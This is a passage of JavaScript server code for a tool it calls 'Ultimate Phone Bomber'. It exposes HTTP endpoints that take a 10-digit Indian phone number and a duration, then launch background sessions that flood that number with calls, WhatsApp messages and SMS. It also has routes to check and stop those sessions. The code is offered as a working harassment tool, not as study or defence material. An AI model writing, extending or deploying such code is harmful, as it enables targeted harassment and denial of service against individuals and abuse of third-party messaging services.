    if (path === '/' || path === '') {
        res.setHeader('Content-Type', 'text/html');
        return res.status(200).send(HTML_PAGE);
    }
    
    // GET /api/bomb/9876543210 (2 minutes)
    if (path.startsWith('/api/bomb/') && path.split('/').length === 4) {
        const phone = path.split('/')[3];
        if (!phone || !/^\d{10}$/.test(phone)) {
            return res.status(400).json({ error: 'Valid 10-digit phone required' });
        }
        
        const sessionId = `${phone}_${Date.now()}`;
        activeSessions.set(sessionId, { phone, active: true, startTime: Date.now(), duration: 2, stats: null });
        
        // Start bombing in background
        startBombingSession(phone, 2, sessionId).catch(console.error);
        
        return res.json({
            success: true,
            message: `💣 BOMBING STARTED on +91${phone}`,
            duration: "2 minutes",
            apis_loaded: ULTIMATE_APIS.length
        });
    }
    
    // GET /api/bomb/9876543210/5 (5 minutes)
    if (path.startsWith('/api/bomb/') && path.split('/').length === 5) {
        const parts = path.split('/');
        const phone = parts[3];
        const duration = parseInt(parts[4]) || 2;
        
        if (!phone || !/^\d{10}$/.test(phone)) {
            return res.status(400).json({ error: 'Valid 10-digit phone required' });
        }
        
        const sessionId = `${phone}_${Date.now()}`;
        activeSessions.set(sessionId, { phone, active: true, startTime: Date.now(), duration, stats: null });
        
        startBombingSession(phone, duration, sessionId).catch(console.error);
        
        return res.json({
            success: true,
            message: `💣 BOMBING STARTED on +91${phone}`,
            duration: `${duration} minutes`,
            apis_loaded: ULTIMATE_APIS.length
        });
    }
    
    // GET /api/start
    if (path === '/api/start') {
        const phone = url.searchParams.get('phone');
        const duration = parseInt(url.searchParams.get('duration')) || 2;
        
        if (!phone || !/^\d{10}$/.test(phone)) {
            return res.status(400).json({ error: 'Valid 10-digit phone required' });
        }
        
        const sessionId = `${phone}_${Date.now()}`;
        activeSessions.set(sessionId, { phone, active: true, startTime: Date.now(), duration, stats: null });
        
        startBombingSession(phone, duration, sessionId).catch(console.error);
        
        return res.json({
            success: true,
            message: `💣 BOMBING STARTED on +91${phone}`,
            duration: `${duration} minutes`,
            apis_loaded: ULTIMATE_APIS.length
        });
    }
    
    // GET /api/status/9876543210
    if (path.startsWith('/api/status/')) {
        const phone = path.split('/')[3];
        
        // Find active session for this phone
        let sessionData = null;
        for (const [id, session] of activeSessions.entries()) {
            if (session.phone === phone) {
                sessionData = session;
                break;
            }
        }
        
        if (!sessionData) {
            return res.json({ active: false, message: "No active bombing session" });
        }
        
        return res.json({
            active: sessionData.active,
            phone: `+91${phone}`,
            duration: `${sessionData.duration} minutes`,
            stats: sessionData.stats || { total: 0, success: 0, failed: 0, call: 0, whatsapp: 0, sms: 0 }
        });
    }
    
    // GET /api/stop/9876543210
    if (path.startsWith('/api/stop/')) {
        const phone = path.split('/')[3];
        
        // Stop all sessions for this phone
        let stopped = false;
        for (const [id, session] of activeSessions.entries()) {
            if (session.phone === phone) {
                session.active = false;
                activeSessions.delete(id);
                stopped = true;
            }
        }
        
        return res.json({
            success: stopped,
            message: stopped ? `🛑 Bombing stopped for +91${phone}` : "No active session found"
        });
    }
    
    // GET /api/info
    if (path === '/api/info') {
        return res.json({
            name: "Ultimate Phone Bomber",
            version: "6.0",
            apis_loaded: ULTIMATE_APIS.length,
            endpoints: {
                bomb_2min: "GET /api/bomb/9876543210",
                bomb_5min: "GET /api/bomb/9876543210/5",
                start: "GET /api/start?phone=9876543210&duration=2",
                status: "GET /api/status/9876543210",
                stop: "GET /api/stop/9876543210",
                webui: "GET /"
            }
        });
    }
    
    // 404
    res.status(404).json({ error: "Endpoint not found" });
};
